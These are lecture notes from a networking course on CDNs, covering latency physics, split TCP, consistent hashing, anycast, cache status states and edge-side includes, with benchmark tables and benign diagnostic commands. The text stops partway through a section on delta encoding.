# 📓 (Ab)using CDNs
### *CN at Scaler — Lesson 6 (Week 6 of 8)* · "someone else's computers, closer to your users"

> **Akamai · CloudFront · Fastly · Google · Broadpeak · Cloudflare** · **SSI · ESI · Railgun · BBR · anycast**
>
> ```
> $ curl -s https://www.cloudflare.com/cdn-cgi/trace | grep colo
> colo=BOM        # you just found out which building answered you
> ```

**Legend for these notes:** 🧠 = my own addition, *not on the slides* — background needed to actually follow the lecture. Everything without 🧠 is from the slides.

---

## What this lecture is about, and why it matters

Weeks 1–5 were about making **one** server (your *origin*) fast: sockets, scaling, nginx, HTTP/1.1 → HTTP/2 → QUIC. But no matter how fast your origin is, it sits in **one place**, and your users are everywhere. Light takes real time to cross the planet, and you cannot optimise physics away.

A **CDN (Content Delivery Network)** is the answer: you rent *someone else's computers* in 300+ cities, put them between your users and your origin, and let them (a) terminate connections close to the user, (b) keep warm connections back to you, and (c) cache whatever they can so the origin is never touched. And because **all your traffic now flows through those boxes**, they turn into much more than a cache: a firewall (WAF), a rate limiter, a DDoS shield, an API gateway, and even a place to run your code (Workers).

The title says "(Ab)using" for a reason: the lecture also covers how a shared cache can be **abused** (cache poisoning, cache deception), and what you **hand over** when you put a stranger in the middle of every request (your TLS keys, a single point of failure, control over your traffic).

> **The lecture's own one-liner:** *"Weeks 1–5 made one origin fast. Today we put a network in front of it."* Week 7 asks what happens when a piece of that fails; Week 8 pushes video through all of it.

---

## Table of contents

0. [Course logistics on the slides](#0--course-logistics-on-the-slides)
1. [Prerequisites from scratch](#1--prerequisites-from-scratch-)
2. [Part 01 — Physics: why the edge exists](#2--part-01--physics-why-the-edge-exists)
3. [Part 02 — What a CDN actually is](#3--part-02--what-a-cdn-actually-is)
4. [Part 03 — Caching, including the uncacheable](#4--part-03--caching-including-the-uncacheable)
5. [Part 04 — Moving bytes faster](#5--part-04--moving-bytes-faster)
6. [Part 05 — Everything that isn't speed](#6--part-05--everything-that-isnt-speed)
7. [Part 06 — Cloudflare, hands-on](#7--part-06--cloudflare-hands-on)
8. [Part 07 — Closing: the bill, the four ideas, the repo](#8--part-07--closing-the-bill-the-four-ideas-the-repo)
9. [Hands-on section: run it yourself](#9--hands-on-section-run-it-yourself)
10. [Assignments and homework](#10--assignments-and-homework)
11. [Cheat-sheet](#11--cheat-sheet)
12. [Self-check questions](#12--self-check-questions)
13. [Next week](#13--next-week-building-for-failures)

---

## 0 · Course logistics on the slides

### Course schedule (8 weeks)

```
 W1 ▸ Network programming 101            W5 ▸ Evolution of HTTP (1.0 → QUIC)
 W2 ▸ Computer Networking Eagle Eye View W6 ▸ (Ab)using CDNs          ← we are here
      (OSI, SS7, protocols)
 W3 ▸ Server Side Considerations for     W7 ▸ Building for failures
      scale
 W4 ▸ nginx deep dive                    W8 ▸ Streaming video at large scale
```

"Where we are" slide title: **"Eight weeks, and today the machine stops being yours."**

### Quiz / submission dates (as on the slide)

| item | date |
|---|---|
| Quiz 1 | 21st Sep, Monday (Binayak will announce timings) |
| Assignment submission | 25th Sep, Friday (during class time) |
| Quiz 2 | 25th Sep, Friday |

The slides also re-show the **Early HTTP/1.1 calculator assignment** and the **binary-HTTP course project** — both are covered in [§10 Assignments](#10--assignments-and-homework).

### Agenda — "Six questions about a box in the middle"

| # | section | one-line promise |
|---|---|---|
| 01 | Why the edge exists | The speed of light is a fixed budget, and your origin spends all of it. |
| 02 | What a CDN actually is | A reverse proxy — Session 4's nginx — rented in 300+ cities. Who the players are. |
| 03 | Caching, including the uncacheable | `cf-cache-status` end to end. SSI → ESI → Ajax → Railgun. Poisoning and deception. |
| 04 | Moving bytes faster | BBR, connection pooling, multiplexing to the origin. |
| 05 | Everything that isn't speed | WAF, rate limiting, DDoS, API gateway, and the trust you hand over. |
| 06 | Cloudflare, hands-on | Demos you can run now with no account; dashboard and Workers. |

---

## 1 · Prerequisites from scratch 🧠

Everything in this section is background the slides assume. Skip what you know.

### 1.1 Origin, client, and "the box in the middle"

```
   CLIENT (browser, app)                          ORIGIN (your server)
   ┌──────────┐      the internet (many hops)     ┌──────────────┐
   │  you     │ ────────────────────────────────▶ │ app + DB     │
   └──────────┘                                   └──────────────┘
```
- **Origin** = *your* server — the one that actually has the data and runs the app. The "source of truth".
- **Client** = whoever sends the request (browser, mobile app, `curl`).
- A **proxy** is a program that sits in the middle and relays requests.
  - A **forward proxy** works *for the client* (e.g. a corporate proxy your laptop is configured to use).
  - A **reverse proxy** works *for the server*: clients think they're talking to the site, but they're talking to the proxy, which forwards to the real origin. **nginx in Session 4 was a reverse proxy.** A CDN is a reverse proxy too — just in hundreds of cities.

### 1.2 Latency, RTT, bandwidth, throughput

| term | meaning | analogy |
|---|---|---|
| **Latency** | time for one bit to get from A to B | how long the road trip is |
| **RTT (Round-Trip Time)** | time to go A → B → A (a request and its reply) | drive there and back |
| **Bandwidth** | max bits per second the link *could* carry | number of lanes on the highway |
| **Throughput** | bits per second you *actually* get | how many cars actually arrive per hour |
| **TTFB (Time To First Byte)** | time from sending a request until the first byte of the response arrives | time until the first pizza slice reaches your plate |

Key intuition: **many network protocols are "talk, wait for reply, talk again"**. Every "wait for reply" costs one RTT. If RTT is 200 ms and a protocol needs 3 round trips before data flows, you've lost 600 ms *doing nothing*.

### 1.3 Handshakes = round trips you pay before any data

**TCP (Transmission Control Protocol)** needs a 3-way handshake before data:
```
  CLIENT                       SERVER
    │──── SYN ────────────────▶│
    │◀─── SYN/ACK ─────────────│      ← 1 RTT gone
    │──── ACK (+ data can go) ─▶│
```
**TLS (Transport Layer Security)** — the "S" in HTTPS — then needs its own handshake to agree on keys:
- TLS 1.2: 2 RTT
- TLS 1.3: 1 RTT

Then the actual HTTP request/response: 1 more RTT. So a **brand-new HTTPS connection = TCP (1) + TLS 1.3 (1) + request (1) = 3 RTT** before you see the first byte of the page. (With TLS 1.2 it's 4.)

**Keep-alive** = reusing an already-open connection, so the next request pays only **1 RTT**. This is the heart of "connection pooling".

### 1.4 What is a cache?

A **cache** is a nearby copy of something that's expensive to fetch. Your fridge is a cache of the supermarket.
- **HIT** = the thing is in the cache → fast.
- **MISS** = not in the cache → go to the source (origin), bring it back, maybe store a copy.
- **TTL (Time To Live)** = how long a cached copy is considered fresh.
- **Stale** = the copy is older than its TTL.
- **Cache key** = the "label" the cache uses to look things up. If two requests produce the same key, they get the *same* cached answer. **This one idea causes most of the bugs in this lecture.**
- **Purge** = deliberately delete something from the cache.

HTTP headers that control caching (Session 5 recap):

| header | meaning |
|---|---|
| `Cache-Control: max-age=N` | anyone may cache for N seconds |
| `Cache-Control: s-maxage=N` | *shared* caches (CDNs, proxies) may cache for N seconds (overrides `max-age` for them) |
| `Cache-Control: private` | only the user's browser may cache, not shared caches |
| `Cache-Control: no-store` | nobody stores this, ever |
| `Cache-Control: no-cache` | you may store it, but must revalidate with origin before each use |
| `ETag` / `If-None-Match` | a version fingerprint; client asks "still version X?" → origin answers `304 Not Modified` (no body) |
| `Vary: <header>` | "the response depends on this request header — include it in the cache key" |
| `Age: N` | how many seconds this response has been sitting in a cache |
| `Set-Cookie` | a personalised response; CDNs usually refuse to cache it |

### 1.5 IP routing, BGP, and anycast in one paragraph

The internet is a network of networks (**ASes — Autonomous Systems**: ISPs, clouds, CDNs). They tell each other "I can reach these IP ranges" using **BGP (Border Gateway Protocol)**. Normally one IP range is announced from one place (**unicast**). With **anycast**, the *same* IP range is announced from **many** places at once, and each router just picks the "best" (usually shortest-BGP-path) announcement. Result: users in Mumbai and London type the same IP but land in different buildings.

```
               announces 104.16.0.0/12          announces 104.16.0.0/12
   Mumbai user ─────▶ [ Cloudflare BOM ]        [ Cloudflare LHR ] ◀───── London user
                       same IP, different building, chosen by BGP
```

### 1.6 Congestion control in one paragraph

TCP's sender doesn't know how fast the path is, so it **guesses and probes**. Classic algorithms (Reno, CUBIC) are **loss-based**: speed up until a packet is lost, treat the loss as "the network is full", cut speed sharply, then grow again. Plotting speed over time gives the famous **saw-tooth**. You saw this in Session 2. BBR (later) is a different idea.

### 1.7 Hashing

A **hash function** turns any input (like a URL) into a fixed-size number. Same input → same number, always. Used to decide "which of my N servers owns this URL?" without a central lookup table.

### 1.8 JWT in one paragraph

A **JWT (JSON Web Token)** is `header.payload.signature`, each part base64url-encoded (Session 5: "JWT is base64url"). The header says which algorithm signed it (e.g. `HS256` = HMAC-SHA256 with a shared secret). The payload has *claims* like `sub` (user id) and `exp` (expiry time). The server verifies the signature using its secret; if it matches, it trusts the claims. base64 is not encryption — anyone can *read* a JWT, only the secret-holder can *forge* one.

---

## 2 · Part 01 — Physics: why the edge exists

### 2.1 The speed of light is the one number you cannot optimise

**Plain English:** data in fibre travels at about two-thirds the speed of light, so distance alone sets a minimum delay. No CPU, no code change, no money can beat it — only *moving closer* can.

From the slide (`python3 bench/01_physics.py`):

```
 light in vacuum     299,792 km/s
 light in fibre      204,218 km/s     # glass slows it to ~2/3 (index 1.468)
                     = 4.90 ms per 1000 km, one way
```

🧠 Where those numbers come from:
```
 speed in fibre = c / n = 299,792 / 1.468 ≈ 204,218 km/s
 time per 1000 km = 1000 / 204,218 s ≈ 4.90 ms   (one way)
 round trip per 1000 km ≈ 9.8 ms
```

The three headline numbers:

| number | what it means |
|---|---|
| **10 ms** | Mumbai → Chennai and back, in perfect straight glass. **Measured ping: 23 ms.** (real cables aren't straight, plus router queues and processing) |
| **126 ms** | Mumbai → Ashburn, Virginia (AWS `us-east-1`) and back — the *floor*. "You cannot go under this. Ever." |
| **47%** | how much faster it would be if the glass were *hollow* (light travels in air ≈ vacuum). Microsoft is deploying hollow-core fibre (Azure, Sep 2025) — "but it is not on your path today." |

🧠 Check the 47%: vacuum/fibre = 299,792 / 204,218 ≈ 1.468 → 46.8% faster.

**The punchline:**
> A round trip to Virginia costs **126 ms** before a single byte of yours is processed. TLS 1.3 needs **three** of those round trips to first byte. That is **~380 ms of nothing**, and no faster CPU touches it.

(126 × 3 = 378 ms.)

**Why this matters:** if your origin is in Virginia and your users are in India, *every* new connection wastes ~0.4 s on physics. The only fix is to make the round trips **shorter** — i.e. put something near the user.

**Pitfall:** "Just buy a faster server." Server speed affects *processing* time, not *propagation* time. They are separate budgets.

### 2.2 One handshake, not two (QUIC recap from Session 5)

The slide (labelled 06 · QUIC · THE ROUND TRIPS) reminds you how many round trips each stack costs on a **cold** (new) connection:

```
 TCP + TLS 1.3 + HTTP/2  (3 RTT cold)        QUIC + HTTP/3  (2 RTT cold)
 ─────────────────────────────────────       ─────────────────────────────────
 SYN         ->                              Initial   ->  TLS ClientHello inside
             <- SYN/ACK                                    a QUIC CRYPTO frame
 ACK         ->                  1 RTT                <-   Handshake          1 RTT
   ...nothing has been said yet.
 ClientHello ->   (ALPN rides here)          GET       ->
             <-   ServerHello …                       <-   200                2 RTT
 Finished    ->                  2 RTT
 GET         ->
             <-   200            3 RTT
 With TLS 1.2 it was four.
```

- **ALPN (Application-Layer Protocol Negotiation)** = a TLS extension where client and server agree "we'll speak h2" during the TLS handshake — so choosing HTTP/2 costs no extra round trip.
- **RFC 9001 §2.1**: in QUIC "there is no transport handshake and then a crypto handshake. There is one handshake." QUIC merges transport setup and TLS 1.3 into one exchange.
- **TLS is not optional** in QUIC. There is no unencrypted QUIC.

Measured (`python3 05-http3/handshake_race.py --rtt 150`):

| stack | measured | round trips |
|---|---|---|
| TCP + TLS 1.3 + h2 (new connection) | 456.6 ms | 3.0 |
| QUIC + HTTP/3 (new connection, 1-RTT) | 319.8 ms | 2.1 |

> *"Layering is how we make systems comprehensible — and every layer boundary is a place you may pay a round trip."*

🧠 That's why QUIC is interesting for CDNs: the user-facing leg starts faster, and CDNs were among the first big QUIC deployers.

### 2.3 Distance charges you twice: once in latency, once in loss

**Plain English:** long paths aren't just slower to *start*; they're also slower to *stream*, because TCP's speed limit falls as RTT and packet loss go up — and long paths have more of both.

Data from **Nygren, Sitaraman & Sun, "The Akamai Network", ACM SIGOPS OSR 44(3), 2010, Table 1** (from an Akamai edge server):

| distance from server | RTT | loss | throughput | 4 GB download |
|---|---|---|---|---|
| local, < 100 mi | 1.6 ms | 0.6% | 44 Mbps | 12 min |
| regional, 500–1,000 mi | 16 ms | 0.7% | 4 Mbps | 2.2 hrs |
| cross-continent, ~3,000 mi | 48 ms | 1.0% | 1 Mbps | 8.2 hrs |
| multi-continent, ~6,000 mi | 96 ms | 1.4% | 0.4 Mbps | 20 hrs |

**The Mathis formula** (Mathis et al., 1997):

```
                      MSS
  Throughput  ≈  ─────────────
                  RTT × √loss
```
- **MSS (Maximum Segment Size)** = payload bytes per TCP packet (~1460 bytes on Ethernet).
- 🧠 The full formula has a constant (~1.22) on top; the slide drops it because only the *shape* matters.

A single TCP flow's ceiling falls with RTT **and** with the square root of loss. The slide's line: **"The far edge is 110× slower, not 60× closer."**
🧠 Decode: RTT went 1.6 → 96 ms (60× longer), but throughput went 44 → 0.4 Mbps (110× lower). Distance hurt *more* than linearly, because loss also went up.

**Why one flow isn't enough:** Session 5's fix — **HTTP/2 multiplexing** (many streams on one connection) — and **BBR** (Part 04) both exist to claw back this exact loss.

**Pitfall:** Thinking bandwidth = throughput. You can have a 1 Gbps line and still get 0.4 Mbps on a single long, lossy TCP flow.

### 2.4 What the edge buys back: handshakes are free, only the cache saves the round trip

The setup (`bench/02_split_tcp.py`, TLS 1.3 on every hop):

```
 you ──10 ms── edge (Mumbai) ──194 ms── origin (Washington)
```

| what the user waits for | content | TTFB | vs direct |
|---|---|---|---|
| direct to origin, new connection | dynamic | 621 ms | 3.0 RTT |
| direct to origin, connection kept alive | dynamic | 208 ms | 1.0 RTT |
| edge with no origin pool (just a longer proxy) | dynamic | 625 ms | 3.1 RTT |
| edge, warm origin pool, new user connection | dynamic | 233 ms | 1.1 RTT |
| edge, warm pool, connection kept alive | dynamic | 209 ms | ≈ direct |
| edge, cache HIT (origin never touched) | static | 34 ms | 0.2 RTT |
| edge, cache HIT, connection kept alive | static | 11 ms | 0.1 RTT |

🧠 How to read each row (total RTT ≈ 10 + 194 ≈ 204 ms):
```
 direct, new conn:        3 × ~204  ≈ 621     (TCP + TLS + GET, all long)
 direct, keep-alive:      1 × ~204  ≈ 208     (just the GET)
 edge, no pool:           3 × 10 (user↔edge) + 3 × 194 (edge↔origin, new each time!)
                          ≈ 625               → a longer proxy, no gain at all
 edge, warm pool:         3 × 10 (short handshakes) + 1 × ~200 (GET over warm conn)
                          ≈ 233
 edge, pool + keep-alive: 10 + ~200 ≈ 209     ≈ direct keep-alive
 cache HIT, new conn:     3 × 10 + tiny ≈ 34  (origin never touched)
 cache HIT, keep-alive:   1 × 10 ≈ 11
```

**The lesson in two sentences (from the slide):**
> A cache **miss** through the edge is no faster than going direct — sometimes slower. The edge earns its place two ways: it keeps **warm connections** to your origin (handshakes), and, when it can **cache**, it deletes the origin round trip entirely (194 ms → 0).

🧠 This trick — terminating TCP/TLS near the user and using a separate, already-warm connection onward — is called **split TCP** (hence the bench name).

**Gotcha (interview favourite):** "Does putting a CDN in front make dynamic, uncacheable pages faster?" → Only by the handshake savings (621 → 233 ms for a new user). The 194 ms origin round trip remains. Without a warm pool, it can even be *slower* (625 ms).

---

## 3 · Part 02 — What a CDN actually is

### 3.1 A CDN is Session 4's reverse proxy, rented in 300+ cities

**Plain English:** a CDN is nginx-with-a-cache, copied into hundreds of data centres around the world, all sharing one IP address, run by someone else and sold as a service.

```
                                                     shield /
   you ───10 ms, nearby───▶  edge PoP  ───one long, controlled leg───▶ tiered cache ───▶ your origin
                          (cache · TLS · WAF)
```
- **PoP (Point of Presence)** = one CDN location (a building / data centre in a city). Cloudflare calls each one a **colo** (colocation facility).
- **Shield / tiered cache** = a middle layer of caches between the edges and your origin (details in §5.3).

**Nothing here is new** (slide's own list):

| CDN piece | you already met it as |
|---|---|
| the reverse proxy | nginx — Session 4 |
| the caching | `proxy_cache` — Session 4 |
| the connection pool | upstream keepalive — Session 3 |
| one IP in every city | anycast — Session 2's addressing |

**What geography adds:**
- the edge is near the user, so the 3-RTT handshake is **cheap** (3 × 10 ms instead of 3 × 200 ms)
- the origin leg is long, but the CDN **owns both ends** of it — its own transport, its own pooling
- a shield / tiered-cache layer means many edges share **one** origin fetch, not N
- **one anycast address**, announced from every city at once

> *"Squid did reverse-proxy caching in 1996. A CDN is this, multiplied by geography and sold as a service."*

🧠 **Squid** is an open-source caching proxy from the mid-90s; it could run in "reverse proxy" (accelerator) mode in front of a web server.

### 3.2 The founding algorithm: consistent hashing

**The problem:** a PoP has many cache servers. Which one should store `/img/logo.png`? You want every request for the same URL to go to the same server (or you'd store N copies and get N misses). And you want to **add servers** without wrecking the cache.

**Naive answer — modulo hashing:** `server = hash(url) % N`. Works fine… until N changes.

🧠 Why it breaks: with N=10, URL with hash 42 → server 2. Add an 11th server: 42 % 11 = 9. Almost every URL's answer changes, because the remainder depends on N.

The benchmark (`python3 bench/06_consistent_hash.py`: 100,000 URLs, 10 caches → add an 11th):

| scheme | URLs that move | busiest vs mean |
|---|---|---|
| `hash(url) % N` | **90.9%** | 1.02× |
| consistent hash, 1 point/server | 3.3% | **2.93×** |
| consistent hash, 160 points/server | 8.2% | 1.14× |

**Modulo hashing is a trap:** add one server and ~90% of URLs move to a different cache. A capacity upgrade becomes a near-total **cache flush** — and a **stampede on your origin at the worst moment** (you were adding capacity because traffic was high!).

**Consistent hashing (Karger et al., STOC 1997):** only the new server's fair share moves — ~1/11. **Virtual points** even out the load. This paper is what **Akamai was founded on** (🧠 its authors include Akamai co-founders Tom Leighton and Danny Lewin). nginx ships it as `hash $request_uri consistent;` (160 points/server, **ketama**-compatible).

🧠 How consistent hashing works:
```
  Imagine a ring of numbers 0 … 2^32-1.
  1. Hash each SERVER onto the ring (place a dot).
  2. Hash each URL onto the ring.
  3. A URL belongs to the first server clockwise from it.

           S1
        .      .            url-A → walks clockwise → S2
     S4          S2         url-B → S3
        .      .
           S3

  Add S5 between S1 and S2  →  only the URLs between S1 and S5 move (to S5).
  Everything else stays put.
```
- With **1 point per server**, the gaps on the ring are random sizes, so one server can own a huge arc → **2.93×** the average load.
- With **160 virtual points per server** (each server hashed 160 times with different suffixes), arcs average out → **1.14×** balance. Slightly more URLs move (8.2%, close to the ideal 1/11 ≈ 9.1%) because the new server takes small slices from *every* old server, which is what you want.

```python
# 🧠 tiny consistent hash ring, for intuition
import hashlib, bisect
def h(s): return int(hashlib.md5(s.encode()).hexdigest()[:8], 16)

class Ring:
    def __init__(self, servers, points=160):
        self.ring = sorted((h(f"{s}#{i}"), s) for s in servers for i in range(points))
        self.keys = [k for k, _ in self.ring]
    def owner(self, url):
        i = bisect.bisect(self.keys, h(url)) % len(self.ring)
        return self.ring[i][1]
```

> *"The same idea recurs all week: choosing an owner without a central registry — DHTs, sharded caches, this. Add capacity without moving the world."*

🧠 **DHT (Distributed Hash Table)** = the same idea used by peer-to-peer systems (BitTorrent's Kademlia) and databases (Cassandra, DynamoDB) to decide which node owns a key.

**Pitfall:** "consistent hashing means zero data moves." No — ~1/(N+1) moves; that's the *minimum possible*, which is the point.

### 3.3 The players: six CDNs — and the software you already know inside them

| CDN | born | runs on / notable for | you met it in |
|---|---|---|---|
| **Akamai** | 1998 | own "ghost" edge servers; **ESI** (2001); FastTCP → BBR | consistent hashing |
| **Amazon CloudFront** | 2008 | AWS edge; BBR to viewers since 2019 (+22%) | S2 congestion |
| **Fastly** | 2011 | a heavily-modified **Varnish** + **H2O**; instant purge | S3/S4 Varnish |
| **Google (Media CDN)** | 2022 | YouTube's edge, opened up; QUIC/BBR everywhere | S5 QUIC · BBR |
| **Broadpeak** | born of video | operator/telco CDN for streaming; on GKE too | S8 next week |
| **Cloudflare** | 2010 | was nginx+LuaJIT (FL1) → Rust/Oxy (FL2, 2025) | S4 nginx → Pingora |

Name-drops explained:
- **"ghost"** — Akamai's name for its edge server software/machines.
- 🧠 **FastTCP** — a delay-based TCP congestion control from Caltech research; Akamai acquired the company behind it (FastSoft) and later moved to BBR.
- **Varnish** — an open-source HTTP caching reverse proxy (Session 3/4). Fastly's edge is a heavily modified Varnish.
- **H2O** — a fast HTTP/1, /2, /3 server written by Kazuho Oku.
- 🧠 **Instant purge** — Fastly's selling point: invalidate cached content worldwide in a very short time.
- **Broadpeak** — a video-focused CDN vendor that telecom operators deploy *inside their own networks* for streaming; also runs on **GKE (Google Kubernetes Engine)**.
- **FL1 / FL2** — Cloudflare's "front line" proxy. FL1 = nginx + **LuaJIT** (Lua scripting compiled just-in-time). FL2 = rewritten in **Rust** on **Oxy** (Cloudflare's Rust proxy framework).
- **Pingora** — Cloudflare's Rust proxy that replaced nginx for **origin-facing** traffic in 2022.

**The software layer is Sessions 3 & 4.** Apache · HAProxy · Varnish · nginx — the reverse proxies from the scaling week — are what most CDNs were built on. Fastly *is* Varnish. Cloudflare *was* nginx, and outgrew it:
- customer edge: nginx+LuaJIT (FL1) → Rust on Oxy (FL2) in **Oct 2025** (**−10 ms, +25%**)
- origin-facing proxy → **Pingora** in **2022**

That's the same "outgrow your proxy" story the last two sessions left as a thread.

### 3.4 Demo: one address, announced from 330+ cities — which one did you get?

```bash
# every Cloudflare-proxied site answers this path
$ curl -s cloudflare.com/cdn-cgi/trace
ip=203.0.113.9
colo=BOM              # ← Mumbai (IATA code)
http=http/1.1 tls=TLSv1.3
kex=X25519MLKEM768    # post-quantum

# which 1.1.1.1 resolver answered?
$ dig +short CHAOS TXT id.server @1.1.1.1
"BOM"
```

- **`colo` is an airport code** (**IATA** = International Air Transport Association codes): BOM Mumbai · DEL Delhi · MAA Chennai · SIN Singapore · LHR London · IAD Ashburn. It's the CDN telling you which of its buildings your packets reached — **chosen by BGP anycast, not by you**.
- **`kex=X25519MLKEM768`** — the key exchange used in TLS. 🧠 It's a *hybrid*: classic X25519 elliptic-curve Diffie-Hellman combined with **ML-KEM-768** (a NIST post-quantum algorithm, formerly Kyber). Even a future quantum computer couldn't decrypt a recording of this session.
- **`dig ... CHAOS TXT id.server`** — 🧠 a DNS query in the special "CHAOS" class (not the normal "IN"ternet class) that many resolvers answer with their own identity. 1.1.1.1 is anycast too, so it tells you which colo answered.
- **The same trick is in every response:** `cf-ray: 8c1a…-BOM` — the suffix is the colo. Every Cloudflare response carries the PoP that served it, which is how you debug *"why is this user slow / stale"*.

> Run it on the classroom wifi, then ask someone on mobile data to run it. **Same domain, same IP, different colo.** That is anycast — Session 2's addressing, put to work.

(Slide source note: live in Sep 2026 it returned `colo=IAD` from the instructor's build host. The title slide shows both `BOM` and `MAA` — two people, two answers.)

**Pitfall:** "anycast picks the geographically closest PoP." Not exactly — BGP picks the best *routing* path according to the ISPs' policies. A Mumbai user on a particular ISP might land in Chennai (MAA) or even Singapore if that ISP's peering is set up that way.

---

## 4 · Part 03 — Caching, including the uncacheable

### 4.1 The defaults: a CDN caches by file extension — and HTML is not on the list

**Plain English:** out of the box, Cloudflare only caches things that *look* static by their file extension. Your HTML pages and API responses go straight to your origin unless you say otherwise.

**What Cloudflare caches with no config:**
- **68 static extensions**: `css js png jpg webp woff mp4 pdf zip …`
- **NOT cached:** HTML, JSON, or anything with `Set-Cookie`, or `Cache-Control: private / no-store / no-cache / max-age=0`
- **Default edge TTL when the origin is silent** (no caching headers):
  - `200` / `301` → **2 hrs**
  - `404` → **3 min**
  - others: not cached

**The cache key is the question:**
- Default key = **scheme + host + path + query** (e.g. `https` + `example.com` + `/app.css` + `?v=3`).
- Everything else — **cookies, most headers** — is NOT in the key. Two users with different cookies **share one cached object**.
- That is correct for `app.css` and **catastrophic for `/account`**.
- `Vary:`, or a **custom cache key**, is how you say "these differ". Session 5's `Vary`, at the edge.

The demo (`demos/cache.sh`):
```bash
$ curl -sI edge/static/app.css | grep -i x-cache
x-cache: MISS        # first visitor pays the origin round trip
x-cache: HIT         # everyone after is free — origin never touched

$ curl -sI edge/page/home | grep -i x-cache
x-cache: DYNAMIC     # HTML: not an eligible extension, straight to origin
```
(The lab edge uses `x-cache`; real Cloudflare uses `cf-cache-status`.)

**Why HTML isn't cached by default:** HTML is often personalised ("Hi, Aarham", your cart). If the CDN cached it by default with a key that ignores cookies, user A's page would be served to user B. Being conservative is the safe default.

### 4.2 The state machine: `cf-cache-status` is a small language

| status | what happened | origin hit? | your callback |
|---|---|---|---|
| **MISS** | eligible, not in cache — fetched from origin | yes | — |
| **HIT** | served from cache, still fresh | no | the whole point |
| **EXPIRED** | was cached, TTL passed, re-fetched | yes | — |
| **REVALIDATED** | TTL passed, origin said 304 — cache reused | cheap 304 | S5 ETag / If-None-Match |
| **UPDATING** | stale served now, refresh in background | async | S4 `proxy_cache_use_stale` |
| **STALE** | origin is down — serve stale anyway | failed | S7: failing gracefully |
| **DYNAMIC** | not eligible — never looked in cache | yes | the default for HTML |
| **BYPASS** | eligible, but origin said no-store | yes | S5 Cache-Control |

```
                 request arrives
                       │
            eligible for caching? ──no──▶ DYNAMIC (straight to origin)
                       │yes
              origin said no-store / bypass rule? ──yes──▶ BYPASS
                       │no
              in cache? ──no──▶ MISS (fetch, store)
                       │yes
              fresh? ──yes──▶ HIT
                       │no (stale)
       ┌───────────────┼──────────────────────┬────────────────────┐
  re-fetch full     ask origin "changed?"   serve stale now,     origin down →
  → EXPIRED         → 304 → REVALIDATED     refresh in bg        serve stale
                                            → UPDATING           → STALE
```

> *"One header, eight states. REVALIDATED is Session 5's conditional request saving bandwidth; STALE is next week's whole topic — the cache is the last thing standing when the origin dies."*

🧠 Real Cloudflare also has `NONE`/`UNKNOWN` (e.g. response generated by a Worker or a rule, never touched the cache). The slide's eight are the ones you'll see most.

🧠 The HTTP headers behind UPDATING / STALE are `Cache-Control: stale-while-revalidate=N` and `stale-if-error=N` (RFC 5861).

**Pitfall:** MISS vs DYNAMIC. Both hit the origin — but MISS means "I *would* cache this, I just didn't have it yet" (next request will HIT), while DYNAMIC means "I'll never cache this" (every request hits origin). If your static asset keeps showing DYNAMIC, your config is wrong.

### 4.3 Caching the uncacheable: four tricks to cache personal pages anyway

**The problem:** pages got personal. A news homepage is 98% the same for everyone, but has "Hi, Aarham" and "Cart (3)" in the header — so the whole page becomes uncacheable. Four historical tricks fix this.

| trick | from | idea |
|---|---|---|
| **SSI — Server-Side Includes** | NCSA HTTPd 1.0a1, **1994** | Holes in an HTML file, filled by the **server** before sending. Predates CGI. nginx still ships it — Session 4. |
| **ESI — Edge-Side Includes** | **Akamai + Oracle**, W3C Note **2001** | The same holes, but filled at the **EDGE**. Cache the shared shell everywhere; assemble per-user at the PoP. |
| **Ajax** | Web 2.0, **~2005** | Push the holes all the way to the **browser**. Cache the body on the CDN; fetch the personal bits async (JavaScript). |
| **Railgun** | Cloudflare **2013–2024** | Give up on caching the dynamic page; send only the **BYTES that changed** since last time. |

```
   WHERE the personal bit gets filled in:

   SSI     [origin fills holes] ─────────────────▶ edge ──▶ browser
   ESI      origin (shell) ──▶ [edge fills holes] ─────────▶ browser
   Ajax     origin (shell) ──▶ edge (cached shell) ──▶ [browser fetches holes via JS]
   Railgun  origin ══ only the diff ══▶ edge (rebuilds full page) ──▶ browser
```

> **One arc:** move the personalisation *outward* — server → edge → browser — so the big shared part can be cached, and only the small personal part is ever recomputed. Each step shrinks what the origin has to do.

🧠 SSI syntax example (nginx `ssi on;`):
```html
<html><body>
  <!--# include virtual="/fragments/header.html" -->
  <h1>Welcome</h1>
</body></html>
```

### 4.4 ESI: shrinks the origin's job by 98% — and the user downloads the same page

The origin sends **one shell**, cacheable by everyone, with two holes:
```html
<header><esi:include src="/fragment/user"/> <esi:include src="/fragment/cart"/></header>
```
```
Cache-Control: s-maxage=300
Surrogate-Control: content="ESI/1.0"
```
- `s-maxage=300` → shared caches (the CDN) may keep the shell for 300 s.
- 🧠 `Surrogate-Control` is a header aimed only at "surrogates" (CDN/reverse-proxy caches), not browsers. `content="ESI/1.0"` tells the edge: "this body contains ESI tags, process them". The edge typically strips it before sending to the user.

The benchmark (`python3 bench/04_esi_bytes.py`, 100 logged-in users, same page; *pages identical per user: yes, 39,676 B each*):

| | origin requests | origin → edge bytes | bytes to users | edge cache |
|---|---|---|---|---|
| **A** · origin assembles the page | 100 | 3,984,200 | 3,992,400 | DYNAMIC ×100 |
| **B** · ESI, edge assembles | **201** | **83,454** | 3,994,793 | HIT ×99, MISS ×1 |

**Read the trade carefully** (slide's own warning):
- **Origin bytes fell 98%** — the shell is fetched once, not 100 times.
- **Bytes to the user are unchanged** — ESI does *not* shrink the download.
- **Origin requests went UP (100 → 201)** — 🧠 1 shell + 100 user fragments + 100 cart fragments = 201. Each personal fragment is its own tiny fetch.
- You move load **off the origin's page-rendering, onto the edge's assembly**. Whether that wins depends on *which is your bottleneck* (rendering a full page with DB queries vs. handling many tiny requests).

The bench asserts the two pages are byte-for-byte identical before counting. The same thing exists as a Cloudflare Worker: `cloudflare/worker-esi` (run in **workerd**, Cloudflare's runtime).

**Gotcha:** "ESI makes pages smaller for users" → false. It makes the **origin's** job smaller.

### 4.5 Delta encoding: Railgun's idea came back as an internet standard in 2025

**Plain English:** if a page changes a little every minute, don't resend the whole page — send only what's different from the version the other side already has. Like sending "track changes" instead of the full document.

Benchmark (`python3 bench/05_delta.py`, a ~24 KB news page regenerated every minute):

| compress the new page… | bytes | % of raw |
|---|---|---|
| gzip -6 (no dictionary) | 4,276 | 17.7% |
| deflate, dict = page 1 min ago | 598 | 2.5% |
| zstd, dict = page 1 min ago (dcz) | **436** | **1.8%** |
| zstd, dict = page 1 HOUR ago | 1,277 | 5.3% |

